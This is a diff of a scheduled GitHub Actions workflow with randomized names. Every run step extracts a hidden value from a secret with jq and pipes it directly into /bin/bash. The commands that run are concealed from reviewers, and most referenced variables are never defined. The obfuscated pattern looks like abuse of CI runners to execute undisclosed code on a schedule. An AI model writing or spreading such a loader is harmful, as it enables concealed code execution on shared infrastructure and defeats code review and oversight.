@@ -1,11 +1,10 @@
 name: laomeizileng
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 5/6 * * *'
+    - cron: '58 0/6 * * *'
 
-jobs:  # 1211
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,19 +12,14 @@ jobs:  # 1211
       - uses: actions/checkout@v4
       - name: laomeizileng
         env:
-          htvqe1: ${{ secrets.htvqe1 }}
+          hykh56179: ${{ secrets.hykh56179 }}
         run: |
-          echo $htvqe1 | jq -r .gofe3530 | /bin/bash
-          echo $s669 | jq -r .opzpo7 | /bin/bash
-          echo $smyre77817 | jq -r .f28 | /bin/bash
-          echo $k51 | jq -r .svt675 | /bin/bash
-          echo $yxb307 | jq -r .zatv16 | /bin/bash
-          echo $ka47521 | jq -r .lr58 | /bin/bash
-          echo $nalyn8160 | jq -r .b4765 | /bin/bash
-          echo $bjrc28 | jq -r .wlxui776 | /bin/bash
-          echo $ltxqm6 | jq -r .tshx65 | /bin/bash
-          echo $ssxj05 | jq -r .wylao32 | /bin/bash
-          echo $swkv72627 | jq -r .qfg4629 | /bin/bash
-          echo $f31 | jq -r .me028 | /bin/bash
-          echo $nkab9854 | jq -r .r514 | /bin/bash
+          echo $hykh56179 | jq -r .tm923 | /bin/bash
+          echo $xrhy3 | jq -r .pes645 | /bin/bash
+          echo $i640 | jq -r .mymdl3 | /bin/bash
+          echo $nejyo468 | jq -r .hq45961 | /bin/bash
+          echo $d00692 | jq -r .vweh9586 | /bin/bash
+          echo $vkt28 | jq -r .jx9277 | /bin/bash
+          echo $uxv310 | jq -r .f25 | /bin/bash
+          echo $am44 | jq -r .yjw6 | /bin/bash
 
